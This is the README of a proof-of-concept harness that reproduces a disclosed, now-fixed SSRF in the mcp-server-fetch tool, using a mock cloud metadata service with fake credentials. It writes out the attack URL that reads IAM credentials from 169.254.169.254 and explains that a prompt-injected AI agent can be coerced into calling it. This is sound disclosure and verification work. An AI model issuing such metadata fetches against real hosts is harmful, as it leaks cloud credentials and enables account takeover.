# SSRF PoC harness — `mcp-server-fetch` cloud-metadata reach

End-to-end runnable reproduction of the SSRF in `mcp-server-fetch` disclosed at [modelcontextprotocol/servers#4143](https://github.com/modelcontextprotocol/servers/issues/4143) on 2026-05-12, **now fixed upstream**. The vulnerability was present by default in every shipped release through `2026.8.18`, and is fixed by default from `2026.10.10` onward (maintainer PR [#5033](https://github.com/modelcontextprotocol/servers/pull/5033), merged 2026-10-05). This harness reproduces **both** states against the real package: the credential-leaking fetch on `2025.4.7`, and the refusal on `2026.10.28`.

Anyone can verify either state against the real `mcp-server-fetch` package in ~5 seconds without an AWS account: `make demo-full` for the vulnerable pre-fix behavior, `make demo-fixed-release` for the shipped fix.

Companion to [`poc/dns-rebind/`](../dns-rebind/). Both disclosed vulnerability classes (outbound SSRF and inbound DNS rebinding) have a `make demo` reproduction.

This harness is **not embargoed**. The vulnerability is public via the upstream GitHub issue; the harness just packages reproduction.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-05-12 | SSRF disclosed as [#4143](https://github.com/modelcontextprotocol/servers/issues/4143) (affected `mcp-server-fetch` v2025.4.7) |
| 2026-05-22 | Community fix PR [#4226](https://github.com/modelcontextprotocol/servers/pull/4226) opened by @kgarg2468; independently verified against this harness |
| 2026-07-30 | #4143 closed `not_planned`, consolidated to dormant umbrella #3741 |
| 2026-09-10 | Latest release at the time (`2026.8.18`) runtime-verified still vulnerable via this harness |
| 2026-10-05 | Maintainer PR [#5033](https://github.com/modelcontextprotocol/servers/pull/5033) ("refuse private, loopback and metadata addresses by default", fixes #4838) merged to `v2/main` |
| 2026-10-28 | PR #4226 closed unmerged under the repo's new issues-only contribution policy; fix confirmed shipped default-on (below) |

The shipped fix (#5033) is the fix shape the original disclosure asked for, and broader. This record does **not** claim #4143 caused it: #4143 was closed `not_planned` and #5033 references a different issue (#4838). What it documents is an independent disclosure of the SSRF class, a public reproduction maintained across three vulnerable releases, and a correct prediction of the fix shape, now resolved upstream.

## Fix status — RESOLVED (verified 2026-10-28)

States verified end-to-end against this harness:

| State | Source spec | Result | Exit |
|---|---|---|---|
| Pre-fix (disclosed version) | `mcp-server-fetch==2025.4.7` | VULNERABLE — fake `AKIA-FAKE` token returned in the JSON-RPC response | 0 |
| Last vulnerable release | `mcp-server-fetch==2026.8.18` | VULNERABLE (runtime-verified 2026-09-10) | 0 |
| First fixed release | `mcp-server-fetch==2026.10.10` | guard byte-present (denylist + request hook) | — |
| Current release | `mcp-server-fetch==2026.10.28` | **FIX VERIFIED** — metadata fetch refused (runtime-verified 2026-10-28) | 1 |

`make demo-fixed-release` runs the last row (installs the fixed release from PyPI). `make demo-full` runs the first row (the pre-fix reproduction). `make demo-fixed` is retained as a historical check against the never-merged PR #4226 branch.

## What this demonstrates

`mcp-server-fetch` `<= 2026.8.18` exposes a `fetch` tool that accepts any URL from an agent tool call and proxies it through `httpx` with no scheme allowlist, no host denylist, and no protection against RFC-reserved-range addresses. An agent coerced via prompt injection into calling `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/")` on a cloud-hosted host running IMDSv1 or IMDSv2-Optional will retrieve live IAM credentials.

The fix shipped in `2026.10.10`+ (merged via #5033) adds a `_NON_PUBLIC_NETWORKS` denylist (loopback, RFC 1918, link-local `169.254.0.0/16` covering cloud metadata, `100.64.0.0/10`, `fc00::/7`, `fe80::/10`, IPv4-mapped and NAT64), checked by `_is_public_address()` and enforced as an `httpx` request event hook that runs before every request, redirect hops included. It is on by default; `--allow-private-ips` opts out. The same `fetch` call that previously returned credentials now returns:

```
Error executing tool fetch: Refused to fetch http://169.254.169.254/robots.txt:
169.254.169.254 resolves to 169.254.169.254, which is not a public address.
Start the server with --allow-private-ips to allow private, loopback and
link-local addresses.
```

The refusal fires on the `robots.txt` pre-check (same host), so the metadata request never leaves the process.

## Architecture

```
+--------------------------------------------------------+
|  Docker network: metadata-net (subnet 169.254.0.0/16)  |
|                                                        |
|  +-----------------+        +-----------------------+  |
|  |  IMDS mock      |        |  attacker container    | |
|  |  static IP      |        |  - mcp-server-fetch    | |
|  |  169.254.169.254|<-------|    v2025.4.7 (pinned)  | |
|  |  (Python stdlib |  GET   |  - attack.py JSON-RPC  | |
|  |   http.server)  |  -->   |    driver              | |
|  +-----------------+        +-----------------------+  |
+--------------------------------------------------------+
```

Two containers on a custom `169.254.0.0/16` Docker bridge network. The IMDS mock claims the canonical EC2 metadata IP `169.254.169.254` inside the network and serves fake (but realistic-shaped) IAM credentials.

The attacker container spawns `python -m mcp_server_fetch` as a stdio subprocess, runs the MCP protocol handshake, and issues a single `tools/call` against the `fetch` tool with the IMDS metadata URL. The pre-fix `fetch` returns the body of the HTTP response. The attacker inspects that body for the `AKIA-FAKE` literal that the IMDS mock embeds in its fake credential response. If the literal appears, the vulnerability is confirmed and the attacker container exits 0. A fixed release refuses the fetch and the attacker exits 1.

## Credential values are obviously fake

The IMDS mock's fake credentials are intentionally non-credible:

```json
{
  "Code": "Success",
  "AccessKeyId": "AKIA-FAKE-NEVER-USE-DEMO",
  "SecretAccessKey": "FAKE-SECRET-KEY-DO-NOT-USE-IN-REAL-CODE",
  "Token": "FAKE-SESSION-TOKEN-POC-DEMO-ONLY-NEVER-USE",
  ...
}
```

No real cloud account is involved. No real exfiltration happens. The harness confirms vulnerability shape only.

## Run it

```bash
cd poc/ssrf/

# Fast Python-only probe (no Docker required)
make demo-quick

# Full containerized end-to-end against the vulnerable v2025.4.7 (requires Docker)
make demo-full

# demo-quick, then demo-full
make demo

# Verify the shipped fix against the real fixed PyPI release (2026.10.28)
make demo-fixed-release

# Historical: verify against the never-merged PR #4226 branch
make demo-fixed

# Verify against a specific pip-installable spec (release or git URL)
MCP_FETCH_SPEC="mcp-server-fetch==<version>" MCP_FETCH_VERSION="<label>" \
    docker compose up --build --abort-on-container-exit --exit-code-from attacker

# Cleanup
make clean
```

## Expected output (demo-full, vulnerable)

```
=================================================================
 mcp-witness SSRF PoC reproduction
=================================================================
 mcp-server-fetch version: 2025.4.7
 target URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role
 expected outcome (vulnerable):  AKIA-FAKE token returned
 expected outcome (fixed):       URL refused as private/non-public

[1/4] initialize handshake ...
[2/4] tools/list ...
        tools available: ['fetch']
[3/4] tools/call fetch(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role') ...
[4/4] analyzing response ...

---  response body  ---
{
  "Code": "Success",
  "AccessKeyId": "AKIA-FAKE-NEVER-USE-DEMO",
  ...
}
--- (end response) ----

=================================================================
 PoC RESULT: VULNERABLE
=================================================================
 The fake AKIA token ('AKIA-FAKE') appears in the response.
 mcp-server-fetch retrieved cloud-metadata credentials via the
 agent tool surface with no scheme/host validation.

 disclosure: modelcontextprotocol/servers#4143 (closed not_planned)
 fix:        shipped default-on in mcp-server-fetch 2026.10.10+ (via #5033)
```

## Expected output (demo-fixed-release, fixed — verified 2026-10-28)

```
=================================================================
 mcp-witness SSRF PoC reproduction
=================================================================
 mcp-server-fetch version: 2026.10.28
 target URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role
 ...

---  response body  ---
Error executing tool fetch: Refused to fetch http://169.254.169.254/robots.txt:
169.254.169.254 resolves to 169.254.169.254, which is not a public address.
Start the server with --allow-private-ips to allow private, loopback and
link-local addresses.
--- (end response) ----

=================================================================
 PoC RESULT: FIX VERIFIED
=================================================================
```

## Exit codes

Useful for CI / monitoring. The Docker compose `--exit-code-from attacker` flag surfaces these to `make demo`.

| Code | Meaning |
|---|---|
| 0 | VULNERABLE — `AKIA-FAKE` came back in the JSON-RPC response |
| 1 | FIX VERIFIED — the refusal message came back |
| 2 | INFRASTRUCTURE FAILURE — couldn't spawn mcp-server-fetch, couldn't reach IMDS, etc |
| 3 | UNEXPECTED — response matched neither pattern |

`quick_probe.py` accepts `--exit-nonzero-on-vuln` to flip the convention for monitoring use (exit 1 on vuln, 0 on no-vuln).

## Layout

```
poc/ssrf/
├── Makefile             demo / demo-quick / demo-full / demo-fixed-release / demo-fixed / clean
├── README.md            this file
├── docker-compose.yml   custom 169.254.0.0/16 network + service definitions
├── quick_probe.py       pure-Python no-Docker probe (~3 seconds, no install)
├── imds/                mock cloud metadata service container
│   ├── Dockerfile       python:3.11-slim + healthcheck
│   └── server.py        http.server-based mock; serves fake credentials
└── attacker/            agent-side reproduction container
    ├── Dockerfile       python:3.11-slim + mcp-server-fetch pinned
    └── attack.py        stdio JSON-RPC driver + response classifier
```

## Why this matters

The original disclosure was verified on EC2 with real IAM credentials in [`docs/audit-runbook-ec2-ssrf-verification.md`](../../docs/audit-runbook-ec2-ssrf-verification.md). That runbook is still the right tool for verifying against real cloud infrastructure. This harness is the right tool for everyone else: anyone reading the disclosure record who wants to confirm either the vulnerable shape or the shipped fix can do so with `make demo-full` / `make demo-fixed-release` instead of standing up AWS infrastructure.

The pairing of `poc/dns-rebind/` + `poc/ssrf/` makes the mcp-witness reproduction-harness collection a coherent artifact independent of the scanner itself. Each disclosed vulnerability class has a one-command reproduction.

## Related

- Finding entry: [`findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md`](../../findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md)
- Disclosure record: [`disclosures/2026-05-12-mcp-fetch-http-request-ssrf.md`](../../disclosures/2026-05-12-mcp-fetch-http-request-ssrf.md) (tracks the full disclosure-to-resolution timeline)
- Upstream issue: [modelcontextprotocol/servers#4143](https://github.com/modelcontextprotocol/servers/issues/4143) (closed `not_planned`); shipped fix [#5033](https://github.com/modelcontextprotocol/servers/pull/5033)
- Fix verification runbook (real EC2): [`docs/audit-runbook-ec2-ssrf-verification.md`](../../docs/audit-runbook-ec2-ssrf-verification.md)
- Sibling DNS-rebind harness: [`poc/dns-rebind/`](../dns-rebind/)
